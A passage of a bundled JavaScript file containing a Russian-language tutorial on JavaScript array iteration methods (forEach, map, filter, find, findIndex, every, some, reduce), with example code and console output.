{…}]\n  ► 0: {Google: \"Chrome\"}\n  ► 1: {Mozilla: \"Firefox\"}\n  ► 2: {Microsoft: \"Edge\"}\n    length: 3\n  ► __proto__: Array(0)\n~~~\n\n________________________________________________________________\n\n\n[◄◄◄Итерирующие методы массивов◄◄◄](page/Array-iterating-methods.md)\n\n________________________________________________________________\n\n[![ico-30 hw] Quiz](quiz/arrayIterationMethods)\n"},45842:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-35 study] Итерирующие методы массивов\n\nЭти методы учат нас мыслить в рамках **функциональной парадигмы**.\n\nВсе итерирующие методы массивов являются **функциями высшего порядка**.\n![ico-20 exclamation] Обязательным первым аргументом каждого метода является **функция**.\n![ico-20 warn] В случае, если при вызове метода первым аргументом не будет функция, то будет сгенерировано исключение **TypeError**.\n^^Второй аргумент метода является опциональным, это ссылка на контекст вызова **функции-аргумента**.^^\n\nПо сути, итерирующие методы являются функциональной \"оберткой\" для цикла **~for...of~**.\nКаждый метод последовательно перебирает элементы массива от первого до последнего, и на каждой итерации вызывает переданную ему **функцию-аргумент.**\n\n**Функция-аргумент** метода имеет три опциональных формальных параметра:\n1) текущий элемент массива.\n2) индекс текущего элемента массива.\n3) ссылка на итерируемый массив.\n\n[►►►Заглянем глубже?►►►](page/Array-iterating-methods-theory.md)\n\n_____________________________________________________\n\n## ![ico-30 icon] forEach()\n\n![ico-20 warn] Этот метод не возвращает никакого значения.\nДавайте сравним работу этого метода с работой цикла **~for...of~**.\n\n◘◘![ico-25 cap] ** 1**◘◘\n\n~~~js\nconst  people = ['Ivan', 'Mary', 'Elena', 'Andrey']\n\npeople.forEach(currentName => console.log(currentName))\n\nfor (const currentName of people) console.log(currentName)\n~~~\n\n^^Здесь мы итерируем массив  **people**  с помощью метода  **~forEach~**^^.\n^^Методу  **~forEach~**  в качестве аргумента  передается анонимная функция:^^\n\n~~~js\ncurrentName => console.log(currentName)\n~~~\n\nВ этом примере результат работы метода **~forEach~** и оператора цикла **~for...of~** будет идентичным.\nОднако в различных ситуациях нам удобнее использовать либо оператор **~for...of~**, либо метод **~forEach~**.\nПоскольку метод **~forEach~** не возвращает никакого значения, использовать его в цепочных вычислениях вроде бы нет смысла.\nТогда в чем же его преимущество перед оператором **~for...of~**?\n\nЕсли вы научитесь мыслить в функциональной парадигме, то преимущество метода перед оператором станет для вас очевидным.\nНо даже если не говорить о том, насколько методы удобнее операторов, есть ряд дополнительных премуществ метода **~forEach~** перед циклом **~for...of~**.\nНапример, метод **~forEach~** передает **функции-аргументу** не только значение элемента массива, но и его индекс.\n\n◘◘![ico-25 cap] ** 2**◘◘\n\n~~~js\nconst  people = ['Ivan', 'Mary', 'Elena', 'Andrey']\n\npeople.forEach((currentValue, index) => console.log(`${index + 1}: ${currentValue}`))\n~~~\n\n~~~console\n1: Ivan\n2: Mary\n3: Elena\n4: Andrey\n~~~\n_______________________________\n\n![ico-25 warn] Если вы еще не знакомы с асинхронщиной (промисами и асинхронными функциями), то вернитесь к следующему примеру позже.\n\n◘◘![ico-25 cap] ** 3**◘◘\n\n~~~js\nconst users = [\n  { name: 'Mary', age: 25, job: 'dev' },\n  { name: 'Piter', age: 37, job: 'worker' },\n  { name: 'Robert', age: 28, job: 'journalist' },\n  { name: 'Stephan', age: 40, job: 'manager' }\n]\n\nconst show = user => new Promise(resolve => setTimeout(() => resolve(user.name), Math.random() * 3000))\n\nusers.forEach(async user => console.log(await show(user)))\n~~~\n\nВ этом примере мы имитируем задержку, связанную с получением данных юзеров с удаленного сервера, с помощью функции **~show~**, которая возвращает промис.\n\nПередавая методу **~forEach~** асинхронную анонимную функцию, мы обеспечиваем последовательный вывод имен юзеров из массива.\n\n~~~console\nMary\nRobert\nStephan\nPiter\n~~~\n\nТеперь воспользуемся оператором **~for...of~**:\n\n~~~js\nfor (const user of users) {\n  show(user).then(name => console.log(name))\n}\n~~~\n\nКак мы видим, имена юзеров выводятся в произвольном порядке:\n\n~~~console\nStephan\nMary\nRobert\nPiter\n~~~\n\nИ для того, чтобы сохранить порядок имен юзеров в соответствии с их индексом в массиве, нам приходится \"заворачивать\" оператор цикла в асинхронную функцию:\n\n~~~js\nasync function showUsers (users) {\n  for (const user of users) {\n    console.log(await show(user))\n  }\n}\n\nshowUsers(users)\n~~~\n\n~~~console\nMary\nRobert\nStephan\nPiter\n~~~\n\nВозникает вопрос - а зачем это делать, если у нас уже есть функциональная \"обертка\" для цикла **~for...of~**?\n_____________________\n\nНадо отметить также, что иногда использование оператора цикла **~for...of~** бывает удобнее, чем вызов метода **~forEach~**.\nНапример, если вы хотите использовать операторы **~continue~** | **~break~**, то ваш выбор - оператор **~for...of~**.\n\n__________________________________________\n\nТретий формальный параметр **функции-аргумента** является довольно проблемным.\nОн является ссылкой на исходный массив.\nА мы знаем, что\n\n☼☼☼ ссылка - это отмычка ☼☼☼\n\nПередача ссылки создает возможность мутировать исходный массив:\n\n◘◘![ico-25 cap] ** 4**◘◘\n\n~~~js\nconst  numbers = [8, 4, 9, 7]\n\nnumbers.forEach((numb, ind, res) => res[ind] = numb * 2)\n\nconsole.log(numbers) // [ 16, 8, 18, 14 ]\n~~~\n\n^^т.е. исходный массив  **numbers**  был изменен^^\n\nПредоставляя **функции-аргументу** метода доступ к исходному массиву по ссылке, мы создаем возможность возникновения **побочных эффектов**, связанных с возможными мутациями исходного массива.\n\n◘◘![ico-25 cap] ** 5**◘◘\n\n~~~js\nconst users = ['Mary', 'Piter', 'Robert', 'Stephan']\n\nusers.forEach((name, index, arr) => console.log(arr.pop()))\n~~~\n\nВозможно, вы ожидали увидеть полный список юзеров в консоли, но увидели только два последних имени из массива:\n\n~~~console\nStephan\nRobert\n~~~\n\nПри этом в массиве users остались только два первых имени:\n\n~~~js\nconsole.log(users)\n~~~\n\n~~~console\n► (2) ['Mary', 'Piter']\n~~~\n\nЭто побочный эффект мутации массива users.\nНа каждой итерации длина массива уменьшается на 1, а метод **~forEach~** сравнивает текущее значение индекса с длиной массива, и останавливает цикл, когда значение индекса становится равно длине массива. После двух итераций значение индекса будет 2, и длина массива тоже будет 2.\n\n___________________________\n\nМутации исходного массива могут возникать даже без передачи ссылки на исходный массив. Это связано с тем, что если элементы массива имеют **ссылочный тип данных**, то **функция-аргумент** метода получит не значение, а ссылку, и это создает возможность мутаций элементов массива по ссылке.\n\n◘◘![ico-25 cap] ** 6**◘◘\n\n~~~js\nconst users = [\n  { name: 'Mary', age: 25, job: 'dev' },\n  { name: 'Piter', age: 37, job: 'worker' },\n  { name: 'Robert', age: 28, job: 'journalist' },\n  { name: 'Stephan', age: 40, job: 'manager' }\n]\n\nusers.forEach(user => console.log(`${user.name}: ${++user.age}`))\n~~~\n\n~~~console\nMary: 26\nPiter: 38\nRobert: 29\nStephan: 41\n~~~\n\n_________________________________________________\n\n### ![ico-25 icon] Контекст вызова функции-аргумента\n\nМетод  **~forEach~**, как, впрочем, и почти все остальные итерирующие методы массивов, может принимать дополнительный аргумент - ссылку на контект вызова **функции-аргумента**.\n\n![ico-20 warn] Однако при этом функция, передаваемая методу в качестве аргумента, не должна быть стрелочной.\n\n\n◘◘![ico-25 cap] ** 7**◘◘\n\n~~~js\nconst intervals = [[1, 8], [2, 3], [4, 7], [5, 6]]\n\nintervals.forEach(function (interval) { console.log(this) }, intervals)\n~~~\n\n^^В результате выполнения этого кода в консоли будет массив **~intervals~**.^^\n^^Фактически передача методу второго аргумента равносильна биндингу контекста:^^\n\n~~~js\nintervals.forEach(function (interval) { console.log(this) }.bind(intervals))\n~~~\n\n^^Поэтому при использовании стрелочной функции, контекст которой изменить невозможно, в консоли мы увидим объект **~window~**^^\n\n~~~js\nconst intervals = [[1, 8], [2, 3], [4, 7], [5, 6]]\n\nintervals.forEach(interval => console.log(this), intervals)\n~~~\n\n_____________________\n\n^^Предположим, мы хотим передавать ссылку на массив **~res~**, куда следует помещать результаты вычислений:^^\n\n◘◘![ico-25 cap] ** 8**◘◘\n\n~~~js\nconst  numbers = [8, 4, 9, 7]\nconst res = []\n\nnumbers.forEach(function (numb, ind) {\n  this.push(numb * ind)\n}, res)\n~~~\n\n^^Такие операции лишены особого смысла, поскольку для этого у нас есть метод <a href=\"#map()\">![ico-20 link]**map**</a>, который будет рассмотрен далее.^^\n\n_________________________________\n\n◘◘![ico-25 cap] ** 9**◘◘\n\n~~~js\nconst tags = ['figure', 'div', 'h3', 'img']\nconst attrs = [\n  {\n    id: 'figure-blue',\n    style: 'padding: 48px; background: #09b;'\n  },\n  {\n    id: 'figure-yellow',\n    style: 'padding: 16px; background: #fa0;'\n  },\n  {\n    style: 'color: #fff; font-family: Arial; font-weight: bold',\n    innerText: 'Welcome, students!'\n  },\n  {\n    src: 'https://pictogrammers.com/images/libraries/mdi.svg',\n    width: 64\n  }\n]\n\nconst parents = [null, 'figure-blue', 'figure-yellow', 'figure-yellow']\n\ntags.forEach((tag, index) => {\n  const elem = (parents[index] ? document.getElementById(parents[index]) : document.body)\n    .appendChild(document.createElement(tag))\n  Object.assign(elem, attrs[index])\n})\n~~~\n\n{{{Array-iteration-methods-1.js}}}\n\n_____________________\n\n### ![ico-20 icon] Примеры с методом forEach\n\n◘◘![ico-25 cap] **10**◘◘\n\n~~~js\n['zero', 'one', 'two', 'three', 'four', 'five', 'six', 'seven', 'eight', 'nine']\n  .forEach((item, index) => Object.assign(window, {\n      [item]: arg => typeof arg === 'function' ? arg(index) : index\n  }))\n~~~\n\nВ этом примере мы создаем с помощью метода **forEach** массив функций с именами\n\"zero\", \"one\", \"two\", \"three\", \"four\", \"five\", \"six\", \"seven\", \"eight\", \"nine\"\n\nКаждая из этих функций проверяет тип переданного ей аргумента **_arg_**,\nи если это ~function~, то вызывает **_arg_**,\nпередавая ей в качестве аргумента свой порядковый номер (0, 1, 2 ...),\nв противном случае возвращает число - свой порядковый номер (0, 1, 2 ...).\n\n{{{Array-iteration-methods-2.js}}}\n\n\n◘◘![ico-25 cap] **10**◘◘\n\n~~~js\n['plus', 'minus', 'divide', 'multiply']\n  .forEach((item, index) => Object.assign(window, {\n    operations: ['+', '-', '/', '*'],\n    [item]: function () {\n      return arguments.length === 2\n        ? eval(`arguments[0] ${this.operations[index]} arguments[1]`)\n        : window[item].bind(null, arguments[0])\n    }\n  }))\n~~~\n\nВ этом примере мы создаем еще один массив функций с именами \"plus\", \"minus\", \"divide\", \"multiply\".\nКаждая из этих функций имеет два формальных параметра,\nпоэтому первым делом она проверяет длину объекта arguments,\nи если длина равна 2, то выполняет соответствующую операцию с аргументами\n(складывает, вычитает, умножает, делит).\nВ протичном случае возвращает каррированную функцию,\nу которой первый аргумент уже \"прошит\",\nи которую можно вызывать с одним (недостающим вторым) аргументом.\n\n{{{Array-iteration-methods-3.js}}}\n\n____________________\n\n![ico-25 memo] Упражнение\n\n^^Разберитесь самостоятельно, что делает следующий код:^^\n\n~~~js\nconst callback = rule => console.log(rule)\n\nArray.from(document.styleSheets)\n  .forEach(sheet => sheet.href && Array.from(sheet.cssRules).forEach(callback))\n~~~\n\n______________________\n\n## ![ico-30 icon] map()\n\nЭтот метод возвращает новый массив.\nЭлементами нового массива будут значения, которые возвращает **функция-аргумент** на каждой итерации.\nФункция-аргумент метода должна возвращать новое значение (должен присутствовать оператор  ~return~).\n\n◘◘![ico-25 cap] ** 1**◘◘\n\n~~~js\nconst users = [\n  { name: 'Mary', birthYear: 1998 },\n  { name: 'Piter', birthYear: 2001 },\n  { name: 'Robert', birthYear: 2004 },\n  { name: 'Helen', birthYear: 1999 },\n  { name: 'Stephan', birthYear: 2002 },\n]\n\nusers.map(user => `${user.name}: ${new Date().getFullYear() - user.birthYear}`)\n~~~\n\n~~~console\n► (5) ['Mary: 26', 'Piter: 23', 'Robert: 20', 'Helen: 25', 'Stephan: 22']\n~~~\n_______________________________\n\nТак же, как и в методе **~forEach()~**, в методе **~map()~**, функция-аргумент имеет три опциональных формальных параметра.\n![ico-20 green-ok] Аргумент **arr** будет содержать ссылку на исходный массив.\n![ico-20 green-ok] Аргумент **index**  - это счетчик итераций, или индекс текущего элемента итерируемого массива.\n\n~~~js\nconst users = [\n  { name: 'Mary', birthYear: 1998 },\n  { name: 'Piter', birthYear: 2001 },\n  { name: 'Robert', birthYear: 2004 },\n  { name: 'Helen', birthYear: 1999 },\n  { name: 'Stephan', birthYear: 2002 },\n]\n\nusers.map((user, index, arr) => {\n  const olders = arr\n    .map(human => human.birthYear > user.birthYear ? human.name : null)\n    .join(' ')\n  return `${user.name} is younger then ${olders}`\n})\n~~~\n\n~~~console\n▼ (5) [...]\n  0: \"Mary is younger then  Piter Robert Helen Stephan\"\n  1: \"Piter is younger then   Robert  Stephan\"\n  2: \"Robert is younger then     \"\n  3: \"Helen is younger then  Piter Robert  Stephan\"\n  4: \"Stephan is younger then   Robert  \"\n  length: 5\n  ► [[Prototype]]: Array(0)\n~~~\n\n______________________________________________\n\n### ![ico-20 icon] Примеры с методом map\n\nПерейдите по [![ico-20 link] **_ссылке_**](https://developer.mozilla.org/en-US/docs/Web/API/Window/location?name=garevna,date=10.07.2018 )\n\nВ консоли новой вкладки выполните код:\n\n◘◘![ico-25 cap] ** 2**◘◘\n\n~~~js\nlocation.search\n  .slice(1).split(',')\n  .map(x => ({ [x.split('=')[0]] : x.split('=')[1] }))\n~~~\n\nУ вас должен получиться результат:\n\n~~~console\n▼ (2) [{…}, {…}]\n  ► 0: {name: \"garevna\"}\n  ► 1: {date: \"10.07.2018\"}\n    length: 2\n  ► __proto__: Array(0)\n~~~\n\n______________________________________________\n\nПерейдите по [![ico-20 link] **_ссылке_**](https://developer.mozilla.org/en-US/docs/Web/API/Window/location?name=garevna,date=10.07.2018 )\n\nТеперь в консоли новой вкладки объявите функцию:\n\n◘◘![ico-25 cap] ** 3**◘◘\n\n~~~js\nfunction getSearchObject () {\n  var obj = {}\n  location.search.slice(1).split(',')\n    .map(x => x.split('='))\n    .map (function (item) { this[item[0]] = item[1] }, obj)\n  return obj\n}\n~~~\n\nВызовите функцию  **~getSearchObject~**.\n\nУ вас должен получиться результат:\n\n~~~console\n▼ {name: \"garevna\", date: \"10.07.2018\"}\n    date: \"10.07.2018\"\n    name: \"garevna\"\n  ► __proto__: Object\n~~~\n\n______________________________________________\n\n◘◘![ico-25 cap] ** 4**◘◘\n\n~~~js\n;['plus', 'minus', 'divide', 'multiply']\n  .map((item, index) => Object.assign(window, {\n    [item] () {\n      const operations = ['+', '-', '/', '*']\n      return arguments.length === 2\n        ? eval(`arguments[0] ${operations[index]} arguments[1]`)\n        : window[item].bind(null, arguments[0])\n    }\n  }))\n~~~\n\n______________________________________________\n\n◘◘![ico-25 cap] ** 5**◘◘\n\n~~~js\nconst funcs = [\n  function () {\n    let res = 0\n    for (const arg of arguments) res += parseFloat(arg) || 0\n    return res\n  },\n  function () {\n    let res = 1\n    for (const arg of arguments) res *= parseFloat(arg) || 0\n    return res\n  },\n  function () {\n    let res = 0\n    for (const arg of arguments) res += parseInt(arg) || 0\n    return res\n  }\n]\n\nFunction.prototype.currying = function (arg, context) {\n  return this.bind(context, arg)\n}\n\nfuncs\n  .map(func => func.currying(2.5))\n  .map(func => func.currying(2))\n  .map(func => func.currying(4.5))\n  .map(func => func())\n~~~\n\n~~~console\n▼ (3) [9, 22.5, 8]\n    0: 9\n    1: 22.5\n    2: 8\n    length: 3\n  ► [[Prototype]]: Array(0)\n~~~\n__________________________\n\n## ![ico-25 icon] filter()\n\nМетод **~filter()~** итерирует массив, проверяя выполнение заданного условия для каждого элемента массива.\nМетод возвращает новый массив.\nВ результирующий массив попадут только те элементы, которые удовлетворяют условию фильтрации.\n\n◘◘![ico-25 cap] ** 1**◘◘\n\n~~~js\nvar sourceArray = [\n  { name: 'Николай Василенко', country: 'Ukraine' },\n  { name: 'Duke Shane', country: 'USA' },\n  { name: 'Demid Shveik', country: 'France' },\n  { name: 'Семен Картко', country: 'Ukraine' },\n  { name: 'Margaret Johnson', country: 'USA' },\n  { name: 'Филипп Данько', country: 'Ukraine' },\n  { name: 'Robert Trump', country: 'USA' },\n]\n\nvar usa = sourceArray.filter(x => x.country === 'USA')\n\nconsole.log(usa)\n\n~~~\n\n◘◘**Результат**◘◘\n\n~~~console\n\n▼ (3) [{…}, {…}, {…}]\n  ► 0: {name: \"Duke Shane\", country: \"USA\"}\n  ► 1: {name: \"Margaret Johnson\", country: \"USA\"}\n  ► 2: {name: \"Robert Trump\", country: \"USA\"}\n    length: 3\n  ► __proto__: Array(0)\n~~~\n\n◘◘![ico-25 cap] ** 2**◘◘\n\n~~~js\nconst getTransactionMode = (() => {\n  const transactions = {\n    readwrite: ['add', 'put', 'delete', 'clear'],\n    readonly: ['get', 'getAll', 'getKey', 'getAllKeys']\n  }\n  return function (transaction) {\n    const res = ['readwrite', 'readonly']\n      .filter(mode => transactions[mode].includes(transaction))\n    return res[0] || new TypeError('Invalid transaction')\n  }\n})()\n\ngetTransactionMode('add')          // 'readwrite'\ngetTransactionMode('getAllKeys')  // 'readonly'\n~~~\n\n_________________________________\n\n## ![ico-25 icon] find()\n\nМетод ищет в массиве и возвращает первый найденный элемент, удовлетворяющий заданному условию.\n\nЕсли такого элемента в массиве нет, возвращает ~undefined~.\n\n◘◘![ico-25 cap] ** 1**◘◘\n\n~~~js\nvar cards = [\n  { num: '457892425', cash: 1100 },\n  { num: '457812840', cash: 3000 },\n  { num: '457855780', cash: 1200 },\n  { num: '457811714', cash: 5000 }\n]\n\ncards.find(card => card.cash > 4000)\n~~~\n\n◘◘**Результат**◘◘\n\n~~~console\n▼ { num: \"457811714\", cash: 5000 }\n    cash: 5000\n    num: \"457811714\"\n  ► __proto__: Object\n~~~\n\n___________________________\n\n◘◘![ico-25 cap] ** 2**◘◘\n\n~~~js\nconst getTransactionMode = (() => {\n  const transactions = {\n    readwrite: ['add', 'put', 'delete', 'clear'],\n    readonly: ['get', 'getAll', 'getKey', 'getAllKeys']\n  }\n  return function (transaction) {\n    const res = ['readwrite', 'readonly']\n      .find(mode => transactions[mode].includes(transaction))\n    return res || 'unacceptable'\n  }\n})()\n\ngetTransactionMode('add')          // 'readwrite'\ngetTransactionMode('getAllKeys')  // 'readonly'\n~~~\n\n_________________________\n\n## ![ico-25 icon] findIndex()\n\nПодобно методу ~find()~, ищет в массиве первый элемент, удовлетворяющий заданному условию.\nОднако возвращает не сам элемент, а его индекс.\n\nЕсли такого элемента в массиве не обнаружено, возвращает **-1**.\n\n◘◘![ico-25 cap] ** 1**◘◘\n\n~~~js\nconst cards = [\n  { num: '457892425', cash: 1100 },\n  { num: '457812840', cash: 3000 },\n  { num: '457855780', cash: 1200 },\n  { num: '457811714', cash: 5000 }\n]\n\ncards.findIndex(card => card.cash > 1500)  // 1\n~~~\n\nОчевидное преимущество перед методом **~indexOf~** заключается в том, что можно работать с массивами элементов, имеющих **ссылочный тип данных**.\nВ данном примере элементами массива являются объекты, и метод **~indexOf~** к этому массиву неприменим.\n\n◘◘![ico-25 cap] ** 2**◘◘\n\n~~~js\nconst functions = [\n  message => message + '$$$',\n  () => Math.random() > 0.5 ? 'success' : 'failure',\n  arg => typeof arg === 'function' ? arg() : arg\n]\n\nconst sample = () => Math.random() > 0.5 ? 'success' : 'failure'\n\nfunctions.findIndex(func => func.toString() === sample.toString())\n~~~\n\n_______________________\n\n## ![ico-25 icon] every()\n\nОсуществляет проверку массива на предмет вхождения элементов, **не** удовлетворяющих заданному условию.\n\nВозвращает логическое значение:\n  • если все элементы массива благополучно прошли проверку - **~true~**.\n  • если хотя бы один элемент не прошел проверку - **~false~**.\n\nФункция, передаваемая методу в качестве первого аргумента, проверяет выполнение заданного условия для каждого элемента массива, и возвращает логическое значение.\n\nМассив итерируется до тех пор, пока функция не вернет значение **~false~**.\nВ этом случае метод вернет **~false~**.\n\nЕсли функция вернет **~true~** для всех элементов массива, метод вернет **~true~**.\n\n◘◘![ico-25 cap] **every**◘◘\n\n~~~js\nconst people = [\n  { name: 'Николай Василенко', country: 'Ukraine' },\n  { name: 'Duke Shane', country: 'USA' },\n  { name: 'Demid Schweik', country: 'France' },\n  { name: 'Семен Картко', country: 'Ukraine' },\n  { name: 'Margaret Johnson', country: 'USA' },\n  { name: 'Филипп Данько', country: 'Ukraine' },\n  { name: 'Robert Trump', country: 'USA' },\n]\n\nconst res = people.every(x => x.country === 'Ukraine')\n\nconsole.log(res)\n~~~\n\n^^В этом примере массив  **people**  проверяется на наличие в нем жителей **не** Украины.^^\n^^Переменная  **res**  будет иметь значение ~false~, поскольку в массиве есть элементы, не удовлетворяющие заданному условию.^^\n\n______________________________________________\n\n## ![ico-25 icon] some()\n\nОсуществляет проверку массива на предмет вхождения элементов, удовлетворяющих заданному условию.\n\nВозвращает логическое значение (найдено / не найдено).\n\n**Функция-аргумент** проверяет выполнение заданного условия для каждого элемента массива, и возвращает логическое значение.\n\nМассив итерируется до тех пор, пока функция не вернет значение **~true~**.\nВ этом случае метод вернет  **~true~**.\n\nЕсли функция вернет **~false~** для всех элементов массива, метод вернет **~false~**.\n\n◘◘![ico-25 cap] **some**◘◘\n\n~~~js\nconst people = [\n  { name: 'Николай Василенко', country: 'Ukraine' },\n  { name: 'Duke Shane', country: 'USA' },\n  { name: 'Demid Schweik', country: 'France' },\n  { name: 'Семен Картко', country: 'Ukraine' },\n  { name: 'Margaret Johnson', country: 'USA' },\n  { name: 'Филипп Данько', country: 'Ukraine' },\n  { name: 'Robert Trump', country: 'USA' },\n]\n\nconst res = people.some(x => x.country === 'Pakistan')\n\nconsole.log(res)\n~~~\n\n^^В этом примере массив  **people**  проверяется на наличие в нем жителей Пакистана.^^\n^^Переменная  **res**  будет иметь значение ~false~, поскольку таких \"персонажей\" в массиве нет.^^\n\n^^Метод **some** можно заменить следущим кодом:^^\n\n~~~js\nconst res = people\n  .map(human => human.country)\n  .includes('Pakistan')\n~~~\nили таким:\n~~~js\npeople\n  .filter(x => x.country === 'Pakistan')\n  .length > 0\n~~~\n\n____________________________\n\n## ![ico-25 icon] reduce()\n\nЭтот метод отличается от своих \"коллег\" списком формальных параметров **функции-аргумента**.\nКонкретно - первым формальным параметром **функции-аргумента** теперь будет не текущий элемент массива, а **переменная-аккумулятор**.\nЗначение этой переменной и будет результатом работы метода.\n\nГибкость и универсальность этого метода заключается в том, что результат его работы может быть чем угодно: числом, массивом, объектом, строкой, логическим значением и т.д.\nЭтот результат \"накапливается\" в **переменной-аккумуляторе**.\n\nКак и все уже рассмотренные итерирующие методы массивов, метод **~reduce~** в качестве первого обязательного аргумента получает функцию.\nОднако второй аргумент метода не является ссылкой на контекст вызова **функции-аргумента**.\nУ него совсем другое назначение: он задает стартовое значение **переменной-аккумулятора**.\n\n![ico-20 warn] **Если стартовое значение аккумулятора не установлено, то в качестве стартового значения аккумулятора будет использовано значение первого элемента массива**.\n\n^^Т.е. если мы не передадим методу второй аргумент, то он установит стартовое значение **переменной-аккумулятора** равным значению первого элемента итерируемого массива.^^\n\n\n![ico-25 cap] Рассмотрим простейший пример:\n\n~~~js\n[1, 2, 3, 4, 5].reduce(accumulator => accumulator * 2) // 16\n~~~\n\nПоскольку стартовое значение аккумулятора не задано, то оно будет равно значению первого элемента массива, т.е. ** 1**.\nЦикл будет \"крутиться\" до последнего элемента массива, но сами элементы не используются **функцией-аргументом**:\n\n~~~js\naccumulator => accumulator * 2\n~~~\n\nПоэтому на каждой итерации значение **переменной-аккумулятора** будет просто удваиваться:\n\n•• 1 * 2 * 2 * 2 * 2 = 16 ••\n\n_____________________________________\n\n![ico-25 cap] Теперь пригласим на эту тусовку второй формальный параметр **функции-аргумента**:\n\n~~~js\n[1, 2, 3, 4, 5].reduce((accumulator, item) => accumulator * item) // 120\n~~~\n\nСтартовое значение **переменной-аккумулятора** будет ** 1** ^^(значение первого элемента массива)^^, но на каждой итерации **переменная-аккумулятор** будет умножаться на значение текущего элемента массива:\n\n•• 1 * 2 * 3 * 4 * 5 = 120 ••\n\n____________________________\n\n![ico-25 cap] Пора ввести в бой стартовое значение **переменной-аккумулятора**:\n\n~~~js\n[1, 2, 3, 4, 5].reduce((accumulator, item) => accumulator * item, 5) // 600\n~~~\n\n•• 5 * 1 * 2 * 3 * 4 * 5 = 600 ••\n\nВот такая замечательная машинка теперь в нашем распоряжении.\n\n_________________________________\n\n![ico-25 cap] Копнем глубже. Задействуем третий формальный параметр **функции-аргумента**:\n\n~~~js\n[10, 2, 3, 4, 5].reduce((accumulator, item, index) => accumulator * item + index) // 1319\n~~~\n\nЗдесь метод **~reduce~** выполняет следующую последовательность вычислений:\n\n•• ((((10 + 0) * 2 + 1) * 3 + 2) * 4 + 3) * 5 + 4 = 1319 ••\n\n_________________________________________\n\nДо сих пор мы рассматривали массив чисел и числовое значение **переменной-аккумулятора**.\n\nОднако потенциал этого метода гораздо больше, и его возможности гораздо шире.\n\n### ![ico-20 icon] Примеры с методом reduce()\n\nДавайте сведем массив строк к объекту.\nДля этого нам обязательно нужно указать стартовое значение аккумулятора, поскольку значением первого элемента массива будет строка, а мы хотим получить объект.\n\n\n◘◘![ico-20 cap] ** 1**◘◘\n\n~~~js\n['plus', 'minus', 'divide', 'multiply']\n  .reduce((res, item) => Object.assign(res, { [item]: item.length }), {})\n~~~\n\n~~~console\n▼ {plus: 4, minus: 5, divide: 6, multiply: 8}\n  divide: 6\n  minus: 5\n  multiply: 8\n  plus: 4\n  ► [[Prototype]]: Object\n~~~\n\n___________________\n\nТеперь сведем массив объектов к строке.\n\n◘◘![ico-20 cap] ** 2**◘◘\n\n~~~js\nconst string = [\n  { name: 'Piter', age: 31 },\n  { name: 'Helen', age: 29 },\n  { name: 'Robert', age: 45 },\n  { name: 'Andrew', age: 24 }\n].reduce((res, user) => res += `${user.name}: ${user.age}\\n`, 'Users:\\n')\n\nconsole.log(string)\n~~~\n\n~~~console\nUsers:\nPiter: 31\nHelen: 29\nRobert: 45\nAndrew: 24\n~~~\n\n_____________________________________\n\nТеперь посчитаем, сколько раз каждый символ встречается в строке, и вернем объект:\n\n◘◘![ico-20 cap] ** 3**◘◘\n~~~js\nconst string = 'With the trust of thousands of partners from around the world, we are dedicated to contributing to the widespread adoption of cryptocurrencies.'\n\nstring\n  .split('')\n  .reduce((result, char) => Object.assign(result, {\n    [char]: (result[char] || 0) + 1\n  }), {})\n~~~\n\n{{{Array-iteration-methods-reduce-2.js}}}\n_____________________________________\n\nТеперь посчитаем, сколько жителей каждой страны в списке.\n\n◘◘![ico-20 cap] ** 4**◘◘\n\n~~~js\nconst people = [\n  { name: 'Alexandra Pugh', country: 'Ukraine' },\n  { name: 'Andrea McKay', country: 'USA' },\n  { name: 'Anthony Webster', country: 'United Kingdom' },\n  { name: 'Noemi Lynch', country: 'Ukraine' },\n  { name: 'Enrique Michael', country: 'France' },\n  { name: 'Collin Roy', country: 'USA' },\n  { name: 'Stella Dillon', country: 'United Kingdom' },\n  { name: 'Lyra Bryant', country: 'France' },\n  { name: 'Shane Dodson', country: 'Ukraine' },\n  { name: 'Dream Douglas', country: 'USA' },\n  { name: 'Bobby Richards', country: 'USA' },\n  { name: 'Carmelo Atkinson', country: 'United Kingdom' }\n]\n\nconst result = people\n  .reduce((result, human) => Object.assign(result, {\n    [human.country]: (result[human.country] || 0) + 1\n  }), {})\n~~~\n\n{{{Array-iteration-methods-reduce-1.js}}}\n\n__________________________________________\n\n◘◘![ico-20 cap] ** 5**◘◘\n\n~~~js\n[5, 4, 3, 1, 10, 5, 9, 2, 1, 4]\n  .reduce((res, number, index, arr) => res += parseInt(number / Math.pow(10, index)), 0)\n~~~\n\nДвижок использует экспоненциальную форму представления малых чисел, т.е. вместо **~0.0000005~** будет **~5e-7~**.\nДля больших чисел происходит то же самое, т.е. вместо **~5000000000000000000000~** будет **~5e+21~**.\n\nОтсюда:\n\n~~~js\nparseInt(5e-7) // 5\n\nparseInt(5e+21) // 5\n\nparseInt(0.0000005) // 5\n\nparseInt(5000000000000000000000) // 5\n~~~\n\n{{{Array-iteration-methods-reduce-3.js}}}\n\n_________________________________________\n\n\n◘◘![ico-20 cap] ** 6**◘◘\n\n~~~js\n[5, 4, 3, 1, 10, 5, 9, 2, 1, 4]\n  .reduce((res, number, index, arr) => res.concat(number / Math.pow(10, index)), [])\n~~~\n\n{{{Array-iteration-methods-reduce-4.js}}}\n\n_____________________________________\n\nФункция, передаваемая методу **reduce** в качестве первого обязательного аргумента,\nкак и в случае других итерирующих методов, может принимать дополнительные аргументы - индекс текущего элемента массива и ссылку на сам исходный массив.\nБлагодаря ссылке, мы можем манипулировать исходным массивом, что делает его мутабельным.\n\n◘◘![ico-20 cap] ** 7**◘◘\n\n~~~js\nconst array = ['first', 'second', 'third', 'fourth']\n\narray.reduce((res, item, index, arr) => {\n  const order = Math.round(Math.random() * (arr.length - 1))\n  res.push(arr.splice(order, 1)[0])\n  return res\n}, array)\n~~~\n\n{{{Array-iteration-methods-reduce-5.js}}}\n\n_____________________________________\n\n### Math.sqrt\n\nПроследим, как будет работать метод **~reduce~**, если передать ему первым аргументом **~Math.sqrt~**.\nБиблиотечная функция **~Math.sqrt~** принимает всего 1 аргумент (число), и возвращает квадратный корень из полученного аргумента.\nЕсли при вызове мы не передаем методу **~reduce~** второй аргумент, он будет использовать в качестве стартового значения аккумулятора значение первого элемента массива.\nНа каждой итерации это значение будет заменяться его квадратным корнем.\nОстальные элементы массива в вычислениях участвовать не будут, поскольку **~Math.sqrt~** принимает всего 1 аргумент, и это будет текущее значение переменной-аккумулятора.\n\n◘◘![ico-20 cap] ** 8**◘◘\n\n~~~js\n;[625, 5, 10].reduce(Math.sqrt) // 5\n~~~\n\nВ этом примере из числа 625 дважды был извлечен квадратный корень:\n••625 -> 25 -> 